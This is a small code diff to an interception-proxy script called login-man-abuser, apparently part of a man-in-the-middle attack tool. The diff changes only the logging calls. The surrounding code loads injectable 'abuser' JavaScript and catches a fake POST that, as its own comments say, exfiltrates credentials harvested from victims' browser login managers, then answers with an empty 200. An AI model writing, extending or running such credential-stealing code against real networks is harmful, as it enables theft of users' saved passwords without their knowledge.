@@ -12,14 +12,14 @@
 var AbuserJavascript = "";
 
 function onLoad() {
-    // console.log( "Loading abuser code from caplets/login-man-abuser.js" );
+    // log( "Loading abuser code from caplets/login-man-abuser.js" );
     AbuserJavascript = readFile("caplets/login-man-abuser.js")
 }
 
 // here we intercept the ajax POST request with leaked credentials.
 function onRequest(req, res) {
     if( req.Method == 'POST' && req.Path == "/login-man-abuser" ) {
-        console.log( "[LOGIN MANAGER ABUSER]", req.ReadBody() );
+        log( "[LOGIN MANAGER ABUSER]\n", req.ReadBody() );
         // this was just a fake request we needed to exfiltrate
         // credentials to us, drop the connection with an empty 200.
         res.Status      = 200;
